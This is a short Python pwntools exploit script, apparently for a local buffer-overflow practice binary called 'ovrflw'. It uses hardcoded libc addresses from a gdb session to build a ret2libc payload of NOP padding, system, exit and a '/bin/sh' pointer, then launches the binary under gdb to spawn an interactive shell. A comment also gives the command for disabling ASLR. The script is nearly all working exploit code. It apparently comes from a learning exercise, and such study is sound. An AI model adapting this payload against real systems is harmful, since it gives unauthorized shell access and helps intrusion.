# ls *.py | entr bash -c 'date; python main.py'
# echo 0 > /proc/sys/kernel/randomize_va_space

import subprocess

from pwn import *
from pwn import gdb

TARGET = "./ovrflw"
# RET = p32(0xDEADC0DE)

'''
gdb-peda$ p system
$1 = {int (const char *)} 0xf7dfe830 <__libc_system>
gdb-peda$ p exit
$2 = {void (int)} 0xf7df1170 <__GI_exit>
gdb-peda$ searchmem '/bin/sh'
Searching for '/bin/sh' in: None ranges
Found 3 results, display max 3 items:
   libc : 0xf7f4b352 ("/bin/sh")
[stack] : 0xffffbaa4 ("/bin/sh")
[stack] : 0xffffbef0 ("/bin/sh")
'''
RET_SYSTEM = p32(0xf7dfe830)
RET_EXIT = p32(0xf7df1170)
BINSH_PTR = p32(0xf7f4b352)

# RET = p32(0xffffba24) # get from coredump

def s(cmd):
    for c in cmd.split(b"\n"):
        if c.strip():
            print(c)
            subprocess.run(["tmuxpwnrestart", "SEND", base64.b64encode(c)])

context.terminal = ["tmuxpwnrestart"]
context.log_level = logging.DEBUG

# g = cyclic_gen()
# print(g.find(b"jaab"))

payload = b""
payload += 112 * b"\x90"
payload += RET_SYSTEM
payload += RET_EXIT
payload += BINSH_PTR

# print(hexdump(payload, width=16, groupsize=16))

io = gdb.debug(TARGET)
io.sendline(payload)
s(
    b"target exec " + TARGET.encode()
    + b"""
    # set follow-fork-mode child
    b *0x080484ca
    """
    + b'run $(echo "' + payload + b'")'
    + b"""
    x/64wx $esp-136
    telescope $esp-136
    """
)
io.interactive()
# it.recv()
